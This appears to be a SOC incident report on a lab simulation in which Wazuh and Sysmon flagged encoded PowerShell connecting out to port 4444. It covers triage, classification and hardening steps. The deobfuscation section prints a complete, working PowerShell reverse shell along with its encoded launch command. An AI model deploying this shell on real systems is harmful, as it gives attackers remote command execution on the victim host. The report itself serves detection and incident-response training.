# Incident Investigation Report: Suspicious Process & LOLBIN Execution

**Incident Case ID**: INC-20261010-002  
**Severity**: High (Level 10)  
**Assigned Analyst**: Tier 1 SOC Analyst  
**Date/Time of Investigation**: 2026-10-10 11:15:00 UTC  
**Status**: Closed - Confirmed Malicious Simulation  

---

## 1. Executive Summary
At 11:08:42 UTC, the Wazuh SIEM triggered Rule `100302` (*PowerShell Base64 Encoded Command Execution*) and Rule `100305` (*LOLBIN Outbound Network Connection on Non-Standard Port*). Analysis of Sysmon Event ID 1 (Process Create) and Event ID 3 (Network Connect) confirmed that `powershell.exe` was spawned by an unexpected parent process (`cmd.exe`) with encoded payload parameters, subsequently establishing an outbound TCP connection to `192.168.56.50:4444`.

---

## 2. Five Ws (Triage Checklist)

| Question | Investigation Finding | Supporting Evidence |
| :--- | :--- | :--- |
| **What was detected?** | Obfuscated PowerShell execution + Outbound TCP 4444 connection | Wazuh Rules `100302` and `100305` |
| **Which endpoint was involved?** | Hostname: `WIN-LAB-EP01` (IP: `192.168.56.101`) | Wazuh Agent ID `001` |
| **Which user was involved?** | User context: `WIN-LAB-EP01\jdoe` | Field: `win.eventdata.user` |
| **When did it occur?** | 2026-10-10 11:08:35 UTC to 11:08:45 UTC | Sysmon Event Timestamps |
| **Processes involved?** | Parent: `cmd.exe` (PID 4912) ➔ Child: `powershell.exe` (PID 6104) | Sysmon Event ID 1 (`Image`, `ParentImage`) |

---

## 3. Deep-Dive Log Evidence & Payload Deobfuscation

### Sysmon Event ID 1 (Process Creation)
- **Image**: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- **Parent Image**: `C:\Windows\System32\cmd.exe`
- **User**: `WIN-LAB-EP01\jdoe`
- **Raw Command Line**:
  ```powershell
  powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUANgAuADUAMAAiACwANAA0ADQANAApADsA...
  ```

### Deobfuscation Analysis (Base64 UTF-16LE Decode)
Using CyberChef / Python base64 decoding:
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.56.50",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```
*Finding*: The payload is a classic PowerShell reverse interactive shell payload attempting interactive command-and-control over raw sockets.

### Sysmon Event ID 3 (Network Connection)
- **Initiating Process**: `powershell.exe` (PID 6104)
- **Source IP / Port**: `192.168.56.101` : `49721`
- **Destination IP / Port**: `192.168.56.50` : `4444` (Default Metasploit / Netcat reverse shell port)
- **Protocol**: `tcp`

---

## 4. Assessment: Benign vs. Malicious
- **Benign Justification Check**: Is this routine IT automation?
  - Legitimate system administration does not hide windows (`-w hidden`), suppress profiles (`-nop`), encode interactive TCP reverse shells, or connect out to port 4444.
- **Classification**: **Confirmed Malicious** (Simulated adversary C2 channel mapped to MITRE ATT&CK T1059.001 and T1071.001).

---

## 5. Defensive Recommendations & Incident Response
1. **Host Isolation**:
   - Immediately sever network interface of `WIN-LAB-EP01` from the LAN to prevent lateral movement.
   - Terminate PID 6104 (`powershell.exe`) and PID 4912 (`cmd.exe`).
2. **Persistence Audit**:
   - Inspect Sysmon Event ID 11 (File Creation) and Event ID 13 (Registry modification) for Run keys (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) created around 11:08 UTC.
   - Audit Scheduled Tasks: `schtasks /query /fo LIST /v`.
3. **Hardening**:
   - Enforce PowerShell Constrained Language Mode (CLM) via AppLocker or WDAC.
   - Configure PowerShell Script Block Logging (Event ID 4104) and Transcription.
